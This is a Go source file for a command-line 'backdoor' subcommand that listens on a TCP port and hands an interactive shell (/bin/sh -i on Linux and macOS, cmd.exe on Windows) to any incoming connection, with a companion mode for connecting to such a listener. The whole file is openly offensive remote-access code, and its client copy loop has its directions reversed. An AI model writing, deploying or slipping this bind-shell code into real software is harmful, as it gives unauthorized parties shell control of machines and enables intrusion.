package cmd

import (
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"syscall"
	"time"

	"github.com/spf13/pflag"
	"go.coder.com/cli"
	"go.coder.com/flog"
)

const tcp = "tcp"

var signals = []os.Signal{syscall.SIGHUP, syscall.SIGINT, syscall.SIGTERM, syscall.SIGQUIT}

type backDoorCmd struct {
	create, connect bool
	port            int
	address         string
}

// Spec returns a command spec containing a description of it's usage.
func (cmd *backDoorCmd) Spec() cli.CommandSpec {
	return cli.CommandSpec{
		Name:  "backdoor",
		Usage: "TODO: ADD USAGE",
		Desc:  "Create and connect to TCP listeners that allow incoming connections shell access.",
	}
}

// RegisterFlags initializes how a flag set is processed for a particular command.
func (cmd *backDoorCmd) RegisterFlags(fl *pflag.FlagSet) {
	fl.BoolVar(&cmd.create, "create", cmd.create, "Create a TCP backdoor. (must be used with the --port flag)")
	fl.BoolVar(&cmd.connect, "connect", cmd.connect, "Connect to a TCP backdoor. (must be used with the --address flag)")
	fl.StringVarP(&cmd.address, "address", "a", cmd.address, "Address of a remote target to connect to. (format: <host>:<port>)")
	fl.IntVarP(&cmd.port, "port", "p", cmd.port, "Port number to listen for connections on. (format: 80)")
}

// Run either creates a new TCP listener or connects to an existing one.
// This launches a shell session for the given GOOS.
func (cmd *backDoorCmd) Run(fl *pflag.FlagSet) {
	var err error

	switch {
	case cmd.create:
		err = create(cmd.port)
	case cmd.connect:
		err = connect(cmd.address)
	default:
		fl.Usage()
	}

	if err != nil {
		flog.Fatal(err)
	}
}

func create(port int) error {
	cmd, err := getSysCmd()
	if err != nil {
		return err
	}

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, signals...)
	connChan := make(chan net.Conn, 1)

	lsnr, err := net.Listen(tcp, fmt.Sprintf(":%d", port))
	if err != nil {
		return err
	}

	go func() {
		conn, err := lsnr.Accept()
		if err != nil {
			flog.Error(err)
			return
		}
		flog.Info("connection established : %s", conn.RemoteAddr().String())
		connChan <- conn
	}()

	for {
		select {
		case signal := <-stop:
			flog.Info("received disconnection signal : %s", signal)
			close(connChan)
			for conn := range connChan {
				conn.Close()
			}
			return nil
		case conn := <-connChan:
			go handle(cmd, conn)
		default:
			time.Sleep(time.Millisecond * 250)
			continue
		}
	}
}

func connect(address string) error {
	conn, err := net.Dial(tcp, address)
	if err != nil {
		return err
	}

	c := make(chan os.Signal, 1)
	signal.Notify(c, signals...)

	go func() {
		defer conn.Close()
		for {
			sig := <-c
			flog.Info("received termination signal : %v", sig)
			return
		}
	}()

	for {
		go io.Copy(conn, os.Stdout)
		io.Copy(os.Stdin, conn)
	}
}

func handle(cmd *exec.Cmd, conn net.Conn) {
	defer conn.Close()
	r, w := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = w
	go io.Copy(conn, r)
	cmd.Run()
}

func getSysCmd() (*exec.Cmd, error) {
	var err error
	switch runtime.GOOS {
	case "windows":
		return exec.Command("cmd.exe"), nil
	case "darwin", "linux":
		return exec.Command("/bin/sh", "-i"), nil
	default:
		err = fmt.Errorf("os %s not supported", runtime.GOOS)
	}
	return nil, err
}
